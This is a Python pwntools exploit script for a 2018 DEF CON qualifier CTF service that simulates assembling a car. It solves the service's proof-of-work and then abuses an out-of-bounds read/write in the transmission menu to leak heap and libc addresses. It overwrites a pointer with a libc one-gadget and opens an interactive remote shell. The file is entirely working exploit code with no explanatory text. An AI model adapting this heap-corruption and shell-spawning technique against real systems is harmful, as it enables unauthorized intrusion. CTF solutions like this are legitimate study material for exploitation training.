#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "2f76febe.quals2018.oooverflow.io"
port = 31337

r = remote(host,port)

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1


def tire(num):
    r.recvuntil("CHOICE:")
    r.sendline("1")
    r.recvuntil("?")
    r.sendline(str(num))

def chassis(idx):
    r.recvuntil("CHOICE:")
    r.sendline("2")
    r.recvuntil("eclipse")
    r.sendline(str(idx))

def engine():
    r.recvuntil("CHOICE:")
    r.sendline("3")

def trans(speed):
    r.recvuntil("CHOICE:")
    r.sendline("4")
    r.recvuntil("?")
    r.sendline(str(speed))


def tire2(width):
    r.recvuntil("CHOICE:")
    r.sendline("1")
    r.recvuntil("CHOICE:")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(width))

def buy():
    r.recvuntil("CHOICE:")
    r.sendline("5")

def trans2(idx,val):
    r.recvuntil("CHOICE:")
    r.sendline("4")
    r.recvuntil("?")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(val))
    r.recvuntil(")")
    r.sendline("1")

def trans2leak(idx,val):
    r.recvuntil("CHOICE:")
    r.sendline("4")
    r.recvuntil("?")
    r.sendline(str(idx))
    r.recvuntil("is ")
    ha = int(r.recvuntil(",")[:-1])
    r.recvuntil(":")
    r.sendline(str(val))
    r.recvuntil(")")
    r.sendline("0")
    return ha

r.recvuntil("Challenge: ")
challenge = r.recvuntil("\n")[:-1]
r.recvuntil(": ")
n = int(r.recvuntil("\n")[:-1].strip())
ans = solve_pow(challenge,n)
print ans
r.recvuntil(":")
r.sendline(str(ans))
tire(134217728)
trans(1)
chassis(1)
engine()
tire2(65535)
buy()
tire(200)
buy()
tire(127)
buy()
tire(127)
buy()
tire(122)
v = ""
for i in range(4):
    v += chr(trans2leak(0x48+i,0))
heap = u64(v.ljust(8,"\x00")) - 0x2020
print hex(heap)
trans2(0x3890,00)
trans2(0x3891,0x30)
trans2(0x3892,0x60)
trans2(0x3893,0)
trans2(0x3898,0x0)
trans2(0x3899,0x40)
trans2(0x389a,0x60)
trans2(0x389b,0x0)
buy()
tire(134217729)
trans2(0x3890,00)
trans2(0x3891,0x30)
trans2(0x3892,0x60)
trans2(0x3893,0)
buy()
trans(1)
tire2(65535)
v = ""
for i in range(6):
    v += chr(trans2leak(24+i,0))
libc = u64(v.ljust(8,"\x00")) - 0x6f690
print hex(libc)
magic = libc + 0x4526a
for i in range(6):
    trans2(16+i,(magic >> i*8) & 0xff)
r.recvuntil("CHOICE:")
r.sendline("6")
r.interactive()
